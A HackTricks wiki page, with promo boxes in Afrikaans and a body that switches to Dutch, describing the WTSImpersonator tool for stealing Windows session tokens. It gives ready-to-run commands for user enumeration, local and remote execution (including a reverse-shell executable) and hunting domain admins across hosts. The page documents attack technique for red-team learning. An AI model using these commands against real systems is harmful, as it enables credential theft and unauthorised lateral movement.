<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>

Die **WTS Impersonator**-instrument maak gebruik van die **"\\pipe\LSM_API_service"** RPC Genoemde pyp om stilletjies ingelogde gebruikers op te som en hul tokens te kaap, terwyl tradisionele Token Impersonation-tegnieke omseil word. Hierdie benadering fasiliteer naadlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word toegeskryf aan **Omri Baso, wie se werk beskikbaar is op [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Kernfunksionaliteit
Die instrument werk deur 'n reeks API-oproepe:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Sleutelmodules en Gebruik
- **Gebruikers Enumereren**: Lokale en externe gebruikersenumeratie is mogelijk met de tool, met behulp van commando's voor beide scenario's:
- Lokaal:
```powershell
.\WTSImpersonator.exe -m enum
```
- Extern, door een IP-adres of hostnaam op te geven:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Commando's Uitvoeren**: De modules `exec` en `exec-remote` vereisen een **Service**-context om te functioneren. Lokale uitvoering vereist eenvoudigweg het WTSImpersonator uitvoerbare bestand en een commando:
- Voorbeeld voor lokale commando-uitvoering:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kan worden gebruikt om een service-context te verkrijgen:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Externe Commando-Uitvoering**: Hierbij wordt op afstand een service gemaakt en geïnstalleerd, vergelijkbaar met PsExec.exe, waardoor uitvoering met de juiste machtigingen mogelijk is.
- Voorbeeld van externe uitvoering:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Gebruikersjachtmodule**: Richt zich op specifieke gebruikers op meerdere machines en voert code uit onder hun referenties. Dit is vooral handig voor het targeten van Domeinbeheerders met lokale beheerdersrechten op verschillende systemen.
- Gebruiksvoorbeeld:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf geadverteerd wilt zien in HackTricks** of **HackTricks in PDF wilt downloaden**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**officiële PEASS & HackTricks merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit je aan bij de** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repo's.

</details>
